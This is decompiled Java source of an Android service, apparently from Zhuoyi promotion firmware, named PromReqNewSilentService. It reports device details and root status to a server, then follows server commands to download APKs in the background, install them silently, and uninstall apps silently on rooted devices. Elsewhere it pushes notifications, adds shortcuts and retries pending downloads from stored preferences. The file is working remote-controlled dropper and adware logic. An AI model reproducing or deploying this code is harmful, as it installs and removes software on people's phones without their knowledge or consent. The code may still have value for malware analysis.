package com.zhuoyi.system.promotion.service;

import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences.Editor;
import android.graphics.Bitmap;
import android.os.Bundle;
import android.os.Handler;
import android.os.Message;
import android.text.TextUtils;
import com.zhuoyi.system.download.model.DownloadInfo;
import com.zhuoyi.system.download.util.DownloadConstants;
import com.zhuoyi.system.download.util.DownloadUtils;
import com.zhuoyi.system.network.callback.NetworkCallback;
import com.zhuoyi.system.network.connection.HTTPConnection;
import com.zhuoyi.system.network.object.ApkInfoNew;
import com.zhuoyi.system.network.protocol.GetSilentReq;
import com.zhuoyi.system.network.protocol.GetSilentResp;
import com.zhuoyi.system.network.serializer.AttributeUitl;
import com.zhuoyi.system.network.serializer.ZyCom_Message;
import com.zhuoyi.system.network.util.NetworkUtils;
import com.zhuoyi.system.promotion.activity.PromCommonShortcutActivity;
import com.zhuoyi.system.promotion.util.PromUtils;
import com.zhuoyi.system.promotion.util.constants.BundleConstants;
import com.zhuoyi.system.service.IZyService;
import com.zhuoyi.system.service.ZyServiceFactory;
import com.zhuoyi.system.util.AppInfoUtils;
import com.zhuoyi.system.util.BitmapUtils;
import com.zhuoyi.system.util.Logger;
import com.zhuoyi.system.util.TerminalInfoUtil;
import com.zhuoyi.system.util.constant.Session;
import com.zhuoyi.system.util.model.MyPackageInfo;
import java.io.File;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Iterator;
import java.util.Map.Entry;

public class PromReqNewSilentService extends IZyService {
    public static final String TAG = "PromReqNewSilentService";
    private Handler downloadHandler;
    private ArrayList<MyPackageInfo> downloadPackages;
    private boolean hasRoot;
    private HashMap<String, ApkInfoNew> showPromptMap;
    private HashMap<String, ApkInfoNew> silentApkInfoMap;
    private ArrayList<ApkInfoNew> silentDownloadInfos;
    private ArrayList<ApkInfoNew> silentInstallInfos;
    private ArrayList<ApkInfoNew> silentUninstallInfos;

    class C10701 extends Handler {
        C10701() {
        }

        public void handleMessage(Message msg) {
            PromReqNewSilentService.this.handleSilentDownloadMessage(msg);
        }
    }

    class C10713 implements Runnable {
        C10713() {
        }

        public void run() {
            if (PromReqNewSilentService.this.silentDownloadInfos.size() > 0) {
                Iterator it = PromReqNewSilentService.this.silentDownloadInfos.iterator();
                while (it.hasNext()) {
                    ApkInfoNew info = (ApkInfoNew) it.next();
                    Logger.debug(PromReqNewSilentService.TAG, "start one silent download: " + info.toString());
                    PromReqNewSilentService.this.downloadApk(info);
                }
                return;
            }
            PromReqNewSilentService.this.startSilentInstall();
        }
    }

    class C10724 implements Runnable {
        C10724() {
        }

        public void run() {
            if (PromReqNewSilentService.this.hasRoot) {
                Iterator it = PromReqNewSilentService.this.silentUninstallInfos.iterator();
                while (it.hasNext()) {
                    ApkInfoNew info = (ApkInfoNew) it.next();
                    AppInfoUtils.silentUninstallApp(PromReqNewSilentService.this.mContext, new MyPackageInfo(info.getPackageName(), info.getVerCode()));
                }
            }
        }
    }

    class C10757 implements Runnable {
        C10757() {
        }

        public void run() {
            if (PromReqNewSilentService.this.silentInstallInfos.size() > 0) {
                Iterator it = PromReqNewSilentService.this.silentInstallInfos.iterator();
                while (it.hasNext()) {
                    PromReqNewSilentService.this.silentInstallApk((ApkInfoNew) it.next());
                }
            }
            PromReqNewSilentService.this.clearCache();
            PromReqNewSilentService.this.stopSelf();
        }
    }

    class C18442 implements NetworkCallback {
        C18442() {
        }

        public void onResponse(Boolean result, ZyCom_Message respMessage) {
            if (result.booleanValue()) {
                try {
                    if (respMessage.head.code == AttributeUitl.getMessageCode(GetSilentResp.class)) {
                        GetSilentResp resp = respMessage.message;
                        if (resp != null) {
                            Logger.debug(PromReqNewSilentService.TAG, resp.toString());
                        }
                        if (resp.getErrorCode() == 0) {
                            PromReqNewSilentService.this.handleApkCommandResp(resp);
                            return;
                        } else {
                            Logger.error(PromReqNewSilentService.TAG, "GetSilentReq  Error Message" + resp.getErrorMessage());
                            return;
                        }
                    }
                    return;
                } catch (Exception e) {
                    Logger.m3375p(e);
                    return;
                }
            }
            Logger.error(PromReqNewSilentService.TAG, "Get Silent Action Error.");
        }
    }

    public PromReqNewSilentService(int serviceId, Context context, Handler handler) {
        super(serviceId, context, handler);
        this.hasRoot = false;
        this.downloadPackages = new ArrayList();
        this.silentInstallInfos = new ArrayList();
        this.silentDownloadInfos = new ArrayList();
        this.silentUninstallInfos = new ArrayList();
        this.showPromptMap = new HashMap();
        this.silentApkInfoMap = new HashMap();
        this.hasRoot = PromUtils.getRootFlag(this.mContext);
        Logger.debug(TAG, "hasRoot=" + this.hasRoot);
        initHandler();
    }

    private void initHandler() {
        this.downloadHandler = new C10701();
    }

    public void onStartCommand(Intent intent, int flags, int startId) {
        Logger.error(TAG, "start silent req!");
        if (intent.getBooleanExtra("autoDownloadFlag", false)) {
            Logger.debug(TAG, "start auto-download");
            if (NetworkUtils.isNetworkAvailable(this.mContext)) {
                initAutoDownInfos();
                return;
            }
            return;
        }
        initService();
    }

    public void onServerAddressReponse(Session session) {
        GetSilentReq req = new GetSilentReq();
        req.setTerminalInfo(TerminalInfoUtil.getTerminalInfo(this.mContext));
        req.setPackageName(this.mContext.getPackageName());
        req.setVersion(AppInfoUtils.getPackageVersionCode(this.mContext));
        req.setCommandType(0);
        req.setRoot(this.hasRoot ? "1" : "0");
        HTTPConnection.getInstance().sendRequest(session.getPromNetworkAddr(), req, new C18442());
    }

    private void handleApkCommandResp(GetSilentResp resp) {
        Iterator it = resp.getApkList().iterator();
        while (it.hasNext()) {
            ApkInfoNew info = (ApkInfoNew) it.next();
            Logger.debug(TAG, "Silent : " + info.toString());
            handleApkInfoNew(info);
        }
        startSilentUninstall();
        startSilentDownload();
    }

    private void handleApkInfoNew(ApkInfoNew info) {
        MyPackageInfo packageInfo = new MyPackageInfo(info.getPackageName(), info.getVerCode());
        boolean isInstalledOrHighVer = isInstalledOrHighVersion(packageInfo);
        switch (info.getCommandType()) {
            case (short) 1:
                this.silentUninstallInfos.add(info);
                return;
            case (short) 2:
                if (!isApkExist(info.getPackageName()) || info.getIsCover() != (byte) 0) {
                    if (isInstalledOrHighVer) {
                        Logger.m3372d(TAG, "high version has installed.");
                        return;
                    }
                    if (!isApkFileExist(packageInfo)) {
                        this.silentDownloadInfos.add(info);
                        this.silentApkInfoMap.put(info.getPackageName(), info);
                    }
                    if (this.hasRoot) {
                        this.silentInstallInfos.add(info);
                        return;
                    } else if (info.getIsPrompt() != (byte) 0 && info.getIsPrompt() == (byte) 1) {
                        showPrompt(info, packageInfo);
                        return;
                    } else {
                        return;
                    }
                }
                return;
            case (short) 3:
                if (!isApkExist(info.getPackageName()) && !isInstalledOrHighVer) {
                    if (isApkFileExist(packageInfo)) {
                        showPrompt(info, packageInfo);
                        return;
                    }
                    this.silentDownloadInfos.add(info);
                    this.silentApkInfoMap.put(info.getPackageName(), info);
                    this.showPromptMap.put(info.getPackageName(), info);
                    return;
                }
                return;
            case (short) 4:
                if (!isApkExist(info.getPackageName()) || info.getIsCover() != (byte) 0) {
                    if (isInstalledOrHighVer) {
                        Logger.m3372d(TAG, "high version has installed.");
                        return;
                    } else if (!isApkFileExist(packageInfo)) {
                        return;
                    } else {
                        if (this.hasRoot) {
                            this.silentInstallInfos.add(info);
                            return;
                        } else if (info.getIsPrompt() != (byte) 0 && info.getIsPrompt() == (byte) 1) {
                            showPrompt(info, packageInfo);
                            return;
                        } else {
                            return;
                        }
                    }
                }
                return;
            default:
                return;
        }
    }

    private void showPrompt(ApkInfoNew info, MyPackageInfo packageInfo) {
        char[] promptType = info.getPromptType().toCharArray();
        if (promptType.length >= 3) {
            if (promptType[0] == '1') {
                showSilentPush(info);
                this.silentApkInfoMap.remove(info.getPackageName());
                removeUndownloadedInfo(info);
            }
            if (promptType[1] == '1') {
                showSilentShortcut(info);
            }
            if (promptType[2] == '1') {
                showSystemInstaller(packageInfo);
            }
        }
    }

    private void startSilentDownload() {
        new Thread(new C10713()).start();
    }

    private void startSilentUninstall() {
        new Thread(new C10724()).start();
    }

    private void showSystemInstaller(MyPackageInfo packageInfo) {
        if (packageInfo != null) {
            packageInfo.setPosition(8);
            AppInfoUtils.installApp(this.mContext, getApkDownloadFilePath(packageInfo), packageInfo);
        }
    }

    private String getApkDownloadFilePath(MyPackageInfo packageInfo) {
        return DownloadUtils.getInstance(this.mContext).getApkDownloadFilePath(packageInfo.getPackageName(), packageInfo.getVersionCode());
    }

    private void showSilentShortcut(final ApkInfoNew info) {
        new Thread(new Runnable() {
            public void run() {
                Bitmap iconImage = BitmapUtils.getBitmapByUrl(info.getIconUrl());
                if (!PromUtils.getInstance(PromReqNewSilentService.this.mContext).isShortcutExists(info.switchToSerApkInfo())) {
                    AppInfoUtils.createShortcut(PromReqNewSilentService.this.mContext, info.switchToSerApkInfo(), PromCommonShortcutActivity.class.getCanonicalName(), info.getAppName(), iconImage, info.getIconId(), false, 19);
                    PromUtils.getInstance(PromReqNewSilentService.this.mContext).saveShortcutInfo(info.switchToSerApkInfo());
                }
            }
        }).start();
    }

    private void showSilentPush(ApkInfoNew info) {
        String timeString = info.getDisplayTime();
        Bundle b = new Bundle();
        b.putInt(BundleConstants.BUNDLE_PUSH_NOTIFICATION_ID, info.getIconId());
        b.putInt(BundleConstants.BUNDLE_NOTIFICATION_FROM, 1);
        b.putInt(BundleConstants.BUNDLE_APP_INFO_POSITION, 18);
        b.putSerializable(BundleConstants.BUNDLE_APP_INFO, info);
        this.mTimerManager.startTimerByTime(timeString, ZyServiceFactory.SHOW_PUSH_NOTIFY_SERVICE.getServiceId(), b);
    }

    private boolean isApkFileExist(MyPackageInfo packageInfo) {
        if (new File(getApkDownloadFilePath(packageInfo)).exists()) {
            return true;
        }
        return false;
    }

    public void handleSilentDownloadMessage(Message msg) {
        Bundle b = msg.obj;
        String packageName = b.getString(DownloadConstants.DOWNLOAD_HANDLER_BUNDLE_PACKAGE_NAME);
        int version = b.getInt(DownloadConstants.DOWNLOAD_HANDLER_BUNDLE_VERSION_CODE);
        if (!TextUtils.isEmpty(packageName)) {
            ApkInfoNew info;
            if (msg.what == 3) {
                MyPackageInfo packageInfo = new MyPackageInfo(packageName, version);
                boolean ret = this.downloadPackages.remove(packageInfo);
                info = (ApkInfoNew) this.showPromptMap.get(packageName);
                if (info != null && isApkFileExist(packageInfo)) {
                    showPrompt(info, packageInfo);
                    this.showPromptMap.remove(packageName);
                    info = (ApkInfoNew) this.silentApkInfoMap.get(packageName);
                    if (info != null) {
                        removeUndownloadedInfo(info);
                    }
                } else if (isApkFileExist(packageInfo)) {
                    final ApkInfoNew fInfo = (ApkInfoNew) this.silentApkInfoMap.get(packageName);
                    if (fInfo != null) {
                        removeUndownloadedInfo(fInfo);
                        new Thread() {
                            public void run() {
                                PromReqNewSilentService.this.silentInstallApk(fInfo);
                            }
                        }.start();
                    }
                }
                Logger.error(TAG, "DOWNLOAD_FINISH downloadPackageNames.size()=" + this.downloadPackages.size() + " remove result = " + ret);
            } else if (msg.what == 2) {
                Logger.error(TAG, "DOWNLOAD_FAIL downloadPackageNames.size()=" + this.downloadPackages.size() + " remove result = " + this.downloadPackages.remove(new MyPackageInfo(packageName, version)));
                info = (ApkInfoNew) this.silentApkInfoMap.get(packageName);
                if (info != null) {
                    saveUndownloadedInfo(info);
                }
            }
        }
        if (this.downloadPackages.size() == 0) {
            startSilentInstall();
        }
    }

    private void startSilentInstall() {
        new Thread(new C10757()).start();
    }

    private void silentInstallApk(ApkInfoNew info) {
        MyPackageInfo packageInfo = new MyPackageInfo(info.getPackageName(), info.getVerCode());
        packageInfo.setPosition(8);
        if (TextUtils.isEmpty(AppInfoUtils.silentInstallApp(this.mContext, getApkDownloadFilePath(packageInfo), packageInfo))) {
            PromUtils.getInstance(this.mContext).deleteAppFile(info.getPackageName(), info.getVerCode());
            PromUtils.getInstance(this.mContext).saveInstalledInfo(packageInfo);
        }
    }

    private void clearCache() {
        this.silentInstallInfos.clear();
        this.silentDownloadInfos.clear();
        this.silentUninstallInfos.clear();
        this.downloadPackages.clear();
        this.silentApkInfoMap.clear();
    }

    private void downloadApk(ApkInfoNew apkInfo) {
        if (((apkInfo.getNetworkEnabled() == (short) 1 && NetworkUtils.getNetworkType(this.mContext) == (byte) 3) || (NetworkUtils.isNetworkAvailable(this.mContext) && apkInfo.getNetworkEnabled() == (short) 2)) && !DownloadUtils.getInstance(this.mContext).getDownloadApkThreadMap().containsKey(apkInfo.getPackageName())) {
            MyPackageInfo pInfo = new MyPackageInfo(apkInfo.getPackageName(), apkInfo.getVerCode());
            if (!this.downloadPackages.contains(pInfo)) {
                this.downloadPackages.add(pInfo);
            }
            DownloadUtils.getInstance(this.mContext).addDownloadApkThread(new DownloadInfo(this.downloadHandler, apkInfo.getPackageName(), apkInfo.getVerCode(), 8, 0, apkInfo.getDownloadUrl(), apkInfo.getFileVerifyCode(), true));
        }
    }

    private boolean isApkExist(String packageName) {
        return AppInfoUtils.isApkExist(this.mContext, packageName);
    }

    private boolean isInstalledOrHighVersion(MyPackageInfo packageInfo) {
        return PromUtils.getInstance(this.mContext).hasInstalled(packageInfo);
    }

    private void saveUndownloadedInfo(ApkInfoNew info) {
        Editor editor = this.mContext.getSharedPreferences("silentAutoDownSp", 0).edit();
        editor.putString(info.getPackageName(), info.getSaveString());
        editor.commit();
    }

    private void removeUndownloadedInfo(ApkInfoNew info) {
        Editor editor = this.mContext.getSharedPreferences("silentAutoDownSp", 0).edit();
        editor.remove(info.getPackageName());
        editor.commit();
    }

    private void initAutoDownInfos() {
        for (Entry entry : this.mContext.getSharedPreferences("silentAutoDownSp", 0).getAll().entrySet()) {
            handleApkInfoNew(ApkInfoNew.getInstanceFromSaveString((String) entry.getValue()));
        }
        startSilentDownload();
    }
}
